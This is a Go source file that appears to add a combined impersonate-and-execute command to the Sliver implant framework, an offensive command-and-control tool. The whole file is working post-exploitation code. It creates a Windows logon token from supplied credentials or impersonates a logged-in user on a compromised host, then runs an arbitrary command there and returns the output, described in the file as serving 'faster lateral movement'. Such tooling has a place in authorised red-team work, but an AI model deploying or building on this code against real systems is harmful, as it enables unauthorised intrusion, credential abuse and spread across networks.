package privilege

/*
	Sliver Implant Framework - Quick Impersonation Workflow
	Copyright (C) 2024  Bishop Fox / mgstate

	Combined impersonate+action commands for faster lateral movement.
*/

import (
	"context"
	"fmt"
	"strings"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ImpersonateAndExecCmd - Impersonate a user and immediately execute a command
func ImpersonateAndExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	domain, _ := cmd.Flags().GetString("domain")
	execCmd, _ := cmd.Flags().GetString("exec")

	if username == "" {
		con.PrintErrorf("Must provide a username with -u\n")
		return
	}

	// Step 1: Create token with credentials if password provided
	if password != "" {
		logonType := "LOGON_NEW_CREDENTIALS" // Type 9 - best for network access
		if _, ok := logonTypes[logonType]; !ok {
			con.PrintErrorf("Invalid logon type\n")
			return
		}

		ctrl := make(chan bool)
		con.SpinUntil(fmt.Sprintf("Creating token for %s\\%s ...", domain, username), ctrl)

		makeToken, err := con.Rpc.MakeToken(context.Background(), &sliverpb.MakeTokenReq{
			Request:   con.ActiveTarget.Request(cmd),
			Username:  username,
			Domain:    domain,
			Password:  password,
			LogonType: logonTypes[logonType],
		})
		ctrl <- true
		<-ctrl

		if err != nil {
			con.PrintErrorf("Token creation failed: %s\n", err)
			return
		}
		if makeToken.Response != nil && makeToken.Response.GetErr() != "" {
			con.PrintErrorf("Token creation failed: %s\n", makeToken.Response.GetErr())
			return
		}
		con.PrintInfof("Token created for %s\\%s\n", domain, username)
	} else {
		// Step 1 alt: Impersonate existing logged-in user
		impersonate, err := con.Rpc.Impersonate(context.Background(), &sliverpb.ImpersonateReq{
			Request:  con.ActiveTarget.Request(cmd),
			Username: username,
		})
		if err != nil {
			con.PrintErrorf("Impersonation failed: %s\n", err)
			return
		}
		if impersonate.Response != nil && impersonate.Response.GetErr() != "" {
			con.PrintErrorf("Impersonation failed: %s\n", impersonate.Response.GetErr())
			return
		}
		con.PrintInfof("Impersonated %s\n", username)
	}

	// Step 2: Execute command if provided
	if execCmd != "" {
		parts := strings.Fields(execCmd)
		execPath := parts[0]
		var execArgs []string
		if len(parts) > 1 {
			execArgs = parts[1:]
		}

		con.PrintInfof("Executing: %s %s\n", execPath, strings.Join(execArgs, " "))

		execResp, err := con.Rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
			Request: con.ActiveTarget.Request(cmd),
			Path:    execPath,
			Args:    execArgs,
			Output:  true,
		})
		if err != nil {
			con.PrintErrorf("Execution failed: %s\n", err)
			return
		}
		if execResp.Response != nil && execResp.Response.GetErr() != "" {
			con.PrintErrorf("Execution error: %s\n", execResp.Response.GetErr())
			return
		}
		if len(execResp.Stdout) > 0 {
			con.Printf("%s\n", string(execResp.Stdout))
		}
		if len(execResp.Stderr) > 0 {
			con.PrintErrorf("%s\n", string(execResp.Stderr))
		}
	}
}
